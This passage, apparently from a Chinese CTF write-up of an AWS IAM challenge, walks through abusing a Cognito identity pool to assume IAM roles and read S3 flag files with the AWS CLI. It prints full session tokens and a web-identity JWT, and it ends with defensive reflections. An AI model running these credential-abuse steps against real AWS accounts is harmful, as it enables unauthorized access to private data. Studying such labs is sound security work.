&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AccessKeyId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;AccessKeyId&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SecretKey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;SecretKey&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SessionToken&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;IQoJb3JpZ2luX2VjEHgaCXVzLWVhc3QtMSJIMEYCIQD4Tm5j5wN2HplygNU6dgtz8m8UoMMHw83VjBIs99UzZAIhAPil8Q6A3AC/XsrHpecvjkhir3cDRV+4BGiWTCz52sKcKtEFCJH//////////wEQABoMMDkyMjk3ODUxMzc0Igx45Fnq/CU7h9djpVkqpQUzW7dQaCAtVqOwLnmtiSUmr4IgKRN2WotXzsIomfGn1t/d+O1uSXtuFtqGrOdv2Vvm3S5/lXOBrPYb1pGrYHm1z6d8I8FcyKSvvLoiDWrJSv+K4Q8YjhfpfljnkIsE9R0Q+0ZpBbMJvt80emLiFoBPvDdewURvOe/jwhhqMU2717C32mgbYI1gF0gC4zZ6tNJcSOizNyp7rzNALnYlfesPpS+J8Heg9XSjYT9frmJLzeE/t9Vt5/U5MpM8VQmt4/oZmAJSG6GuvWSQ9BWczDeYlsFJHX/JluXssEF5cRghcduUPrGVuainY5r8rdll0u98XcaW2oipE2z2fX1HjfM4KtIUucRyhfAPJwGOgFV1woS1zP/PBNychB9yAeApbppGcayQnUTKic4WmA3Ds7d8XxhITh1Wog77acH5GE5yP0QzhLG5mq1YTCtt4ZqyZU1aY4oniywWtvecQP9pYAQWapLE5ZysbTwW6FDIWTCDVVTAJgtccrRlPSx1xGu64ipJWPGfBS25MQuKdBIoJBFN3g5CwE57YDfa806Z19TxNnS7anVU1bQFNUaIxbvfsGIuxAjWC1ntrx2UbRYrlRXcctJhopr/bWkd68NHTw6UGNY5SfqKhenV0vaIrbpM9ZcrPCkRwT+TUOr+/TlmMfRnMalEqxjbGxLQuwv1JIFpPnwpRUPyJCp+gOlezJUfchsGluiQ2VQ1yy4eO+lBQ8azO243/mrr3ieEHj5CUS5c0BBSSaTxqJCFzH0VUpBJ/iDWmlio71v3pvha7H7wuWsdwT/ahOXv5d7dagH8LZF7lgJ2uWgsnQ5skhe4ZYXhHSEzbVCIJvt8+tTLt4zKvQ2k2BOoN2+VnZX08JPUmPIMgkD3vyYDNLawcQeLsNFY506AzEVv4TCvl9K2BjrdAg0Itz+iWPd/LYzGfIAK3BE4SCaNGI5qgBnOa2ppd6Ymnlpi7oTII1/G9iX83RP2vrt4kyS37r074FC1XfAr6btl7KlcaQhhqfrqyuupMpuTRtefSJw7rzbH3jZ71GcBkSPSBQLMmZqFKYRxV0aDWv91mdKKBcVu/7ZmjCIF/y5kCwjtLsvgY22H9uTMHCCP+Y0HBQXr7cx1+Q2mBO/QiE9+o3PzsFmlXnz7AVFEyvtpSQE58CnTlLBjN0oxBXrd0DYyUYIYVE5CLoof6/YYJQ2qTC4hVAT8KZDY+LrmoWMXKDPTrbnFdlsKwRv2fTbdzXRvSsyFz/fAyG752zw7DBWmeeeVllEFNB0Zr2GZ2Jd6BU1Uh8d9Wp2l6SqNMEoy7jHXBrAdM5iekoE0wK5rA9ppZ+hgX1Vrw19r0bc4cMQiU3w6j9mLnxX5Tjp2zaQw96HzLHxj/PEJshCxhFQ=&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Expiration&amp;#34;&lt;/span>: 1725209023.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过上述操作，可以获得临时凭证。
下面通过本地的aws cli使用临时凭证访问S3存储桶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws configure set aws_access_key_id &amp;lt;AccessKeyId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws configure set aws_secret_access_key &amp;lt;SecretKey&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws configure set aws_session_token &amp;lt;SessionToken&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws sts get-caller-identity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;UserId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Account&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;092297851374&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3 ls s3://wiz-privatefiles
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-06 03:42:27 &lt;span style="color:#ae81ff">4220&lt;/span> cognito1.png
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 21:28:35 &lt;span style="color:#ae81ff">37&lt;/span> flag1.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3 cp s3://wiz-privatefiles/flag1.txt -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>wiz:incognito-is-always-suspicious&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-4">思考&lt;/h3>
&lt;p>前端代码cognito-identity敏感数据泄露，导致相关AK/SK直接访问S3。&lt;/p>
&lt;h2 id="challenge6-one-final-push">challenge6: One final push&lt;/h2>
&lt;h3 id="解题-5">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Federated&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;cognito-identity.amazonaws.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;sts:AssumeRoleWithWebIdentity&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Condition&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;StringEquals&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;cognito-identity.amazonaws.com:aud&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这段策略的主要功能是允许 Cognito 身份池通过 Web 身份验证来假设角色。具体来说：&lt;/p>
&lt;ul>
&lt;li>Principal: 允许的联合身份提供者是 Cognito 身份池 (cognito-identity.amazonaws.com)。&lt;/li>
&lt;li>Action: 允许的操作是通过 Web 身份验证来假设角色 (sts:AssumeRoleWithWebIdentity)。&lt;/li>
&lt;li>Condition: 条件是 Cognito 身份池的受众（aud）必须等于指定的身份池 ID (us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b)。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;IdentityId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 从 Amazon Cognito 获取一个 OpenID Connect (OIDC) 令牌&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;IdentityId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Token&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;eyJraWQiOiJ1cy1lYXN0LTEtNiIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU3NS1jODlmLTI3Y2QtZTdjZDdlN2E5ZjIwIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MjUyMDczNzgsImlhdCI6MTcyNTIwNjc3OH0.gGrZv64aDiDDwIJkMZAmvKjqwAreOCL0lNc6yokufj42D_kBg-0qlkFqU-uhnbnXX3-5T44xoABUyOcAOeAxRFGbW6zgj_xWJ_HT2S2-mm39hSVNJ-DZ9QkG3HaYgip1OabTJveaRHx2iPsYF22NKwTAUQ2_0UANM1rq4_vtbfflqazNF5CVdmLmXLF2CPTxjIx2dAhJ6ef-L9PgPeVc9RfjJfsWNmZOUiU1A6hznRFKuZggYtW4LS9a0Og3VbrS3EH0AkF4jHeLundQp8VOXoXdnac4lUk0z9nePpngYAR4Ej6nHlxQ3f-t9Xw4su0S8eCPYQ9AfgrBEGMEeiuyAQ&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 通过 Web 身份验证来假设一个 IAM 角色，并返回临时安全凭证和会话信息&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --role-arn参数 arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role 来自于题目&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --role-session-name参数 随机取名即可&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name wiz --web-identity-token &amp;lt;Token&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Credentials&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AccessKeyId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;AccessKeyId&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SecretAccessKey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;SecretAccessKey&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SessionToken&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;IQoJb3JpZ2luX2VjEHkaCXVzLWVhc3QtMSJHMEUCIQCBmnQsixW+2qATYKxORysnt4Ve1pxUyO44O5JZMBL0YgIgMdRynGfW0xe/9QZiuqMZues90a+esibC268qjY9anEEqjQMIkf//////////ARAAGgwwOTIyOTc4NTEzNzQiDApUaiK62q+bhTqPdyrhAigATTpURCuQ9gV4DbVrjH6ebcoA1uZDqKMh5BFAv81Z2Tr1q6cYfAWqeBH9c9UBiFovpmUD/ZQbqnz35ctHjAxfUAVSATGOrNasQyDKSvwTy8V+28OQNesiJpiRpeSqcIWDfPbQkwRsLsgZVSWyvWkMSOGh7oWebGMxdAR0AbPamTFOoFJ12kXLHYBAhx1q8XZJuS5Hg0YMlfOJWG5C9YTlcZVx1lrRhwm5BpcHtgnVDAB5XT6UXAjPeK/ExaXaDi4LS00DLTF1lItC+wAOSe7VYQMo57ilHB8B45OXMtvU2xcyJlTVmm/niJPWYBSvPA/jif2tIEOGc8l3oT/pgrEdgQ2kF3Xt+bvtBUuIvAROEbKLQBwqvT1EcRcj+VvZNCopyCjYjQjDwmzbGUAD41XIxFt3nilPV3sZ/YezUcK2FdEX1kLHM74ywNCUBzo3G+7oW8NywY+xUPFIza7AsDMIWm0rYGOocClOK9oSKSg8Ylgi45zjAjvI85j8KqZGwi8Syxpjvn6BT+N2/Ppr2IpBIlVLm7THh9M4i7OLAhK4s8FxOJY3pVC+HMwNZbmQZB9iE4GJ0L0RfdptPbj8mguSts6EKfWH0kmvYEiLf/vbrYW84GaBBDhdF7kBK0ZrD3ep46qQ5ZcaPKxHIlNifCLGH+DR3bdxoMT7j7gAmup6xfR0KaGTxVWqQD7lFy0hfXoKx3aLen4B34cM6eR6aSvCcqbHuiSFbOd5l68y8IT+UmfLGyUzSbHlv/395gmJ32vNFD8JXS9/uJlVaKhcmJBqU3AQYZNjd2fn3+Vz1gWWg1vE1dEOMNJKx9PcRnwjw=&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Expiration&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2024-09-01T17:15:01+00:00&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SubjectFromWebIdentityToken&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:157d6171-ee75-c89f-27cd-e7cd7e7a9f20&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AssumedRoleUser&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AssumedRoleId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AROARK7LBOHXASFTNOIZG:wiz&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/wiz&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Provider&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;cognito-identity.amazonaws.com&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Audience&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过上述操作，可以获得临时凭证。
下面通过本地的aws cli使用临时凭证访问S3存储桶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws configure set aws_access_key_id &amp;lt;AccessKeyId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws configure set aws_secret_access_key &amp;lt;SecretKey&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws configure set aws_session_token &amp;lt;SessionToken&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws sts get-caller-identity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;UserId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AROARK7LBOHXASFTNOIZG:wiz&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Account&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;092297851374&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/wiz&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3 ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2024-06-06 14:21:35 challenge-website-storage-1fa5073
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2024-06-06 16:25:59 payments-system-cd6e4ba
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 21:28:31 wiz-privatefiles
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-05 21:28:31 wiz-privatefiles-x1000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3api list-objects-v2 --bucket wiz-privatefiles-x1000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Contents&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;cognito2.png&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LastModified&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-06-05T19:42:27+00:00&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ETag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;539693e3b6f41aa7545e9f8965c3cadd\&amp;#34;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Size&amp;#34;&lt;/span>: 4220,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;StorageClass&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;STANDARD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;flag2.txt&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LastModified&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-06-05T13:28:35+00:00&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ETag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;48b4d561fb4900a861fa55626be4a103\&amp;#34;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Size&amp;#34;&lt;/span>: 40,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;StorageClass&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;STANDARD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">]&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;RequestCharged&amp;#34;&lt;/span>: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>wiz:incognito-is-always-suspicious&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-5">思考&lt;/h3>
&lt;p>为了防止攻击者同时获取身份池 ID 和角色 ARN 并利用它们获取相应角色的权限，必须确保这两者的信息得到妥善保护。&lt;/p></content></item></channel></rss>